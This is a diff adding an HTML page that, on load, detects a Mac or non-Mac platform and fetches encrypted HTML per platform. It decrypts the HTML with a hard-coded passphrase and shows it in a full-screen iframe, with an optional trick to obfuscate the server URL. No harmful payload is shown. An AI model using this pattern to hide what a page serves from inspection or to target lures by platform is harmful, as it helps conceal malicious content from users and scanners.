@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Encrypted education content</title>
+  <!-- CryptoJS CDN -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+  <style>
+    html, body { margin: 0; padding: 0; height: 100%; }
+    /* iframe poore page ko bharta hai */
+    #frame { display: block; width: 100%; height: 100vh; border: 0; }
+    #status { font-family: system-ui, sans-serif; padding: 16px; color: #555; }
+  </style>
+</head>
+<body>
+  <div id="status">⏳ Encrypted content fetch + decrypt ho raha hai…</div>
+  <iframe id="frame" title="decrypted content" style="display:none;"></iframe>
+
+  <script>
+    const PASSPHRASE = "key123";  // education content ki AES key (server PASSPHRASE se match kare)
+
+    // ===================== CONFIG =====================
+    // DATA_ORIGIN = DigitalOcean par chal rahe DATA server ka URL.
+    //  - Local dev me:  "http://localhost:5002"
+    //  - Production me:  "https://api.tumhara-domain.com"  (HTTPS zaroori — neeche note dekho)
+    // NOTE: Frontend HTTPS (Forge) par hai, isliye DATA_ORIGIN bhi HTTPS hona chahiye,
+    //       warna browser "mixed content" bol ke block kar dega.
+    const DATA_ORIGIN = "http://localhost:5002";   // <-- deploy karte waqt yahan apna API URL daalo
+    const DATA_URL = DATA_ORIGIN + "/data";
+
+    // (Optional) URL ko encrypted rakhna ho to:
+    //   const ENC = "U2FsdGVkX1...";  // CryptoJS.AES.encrypt(DATA_ORIGIN+"/data","urlkey")
+    //   const DATA_URL = CryptoJS.AES.decrypt(ENC,"urlkey").toString(CryptoJS.enc.Utf8);
+    // (Yaad rahe: yeh sirf obfuscation hai, real security nahi — URL Network tab me dikhega.)
+    // ==================================================
+
+    let lastUrl = null;
+
+    // Platform detect: Mac hai ya nahi?
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "other";
+    }
+
+    async function loadSecret() {
+      const status = document.getElementById("status");
+      const frame  = document.getElementById("frame");
+      try {
+        // 1. cross-origin fetch (platform ke hisaab se alag content)
+        const platform = detectPlatform();
+        const res = await fetch(DATA_URL + "?platform=" + platform);
+        const { cipher } = await res.json();
+
+        // 2. AES decrypt (CryptoJS)
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt fail — galat key?");
+
+        // 3. Blob (text/html) -> blob URL -> iframe (full page)
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
+
+        frame.src = lastUrl;
+        frame.style.display = "block";
+        status.style.display = "none";   // status hata do, sirf iframe dikhe
+      } catch (e) {
+        status.textContent = "⚠️ Error: " + e.message;
+      }
+    }
+
+    // bina click ke, page khulte hi auto load
+    window.addEventListener("DOMContentLoaded", loadSecret);
+  </script>
+</body>
+</html>
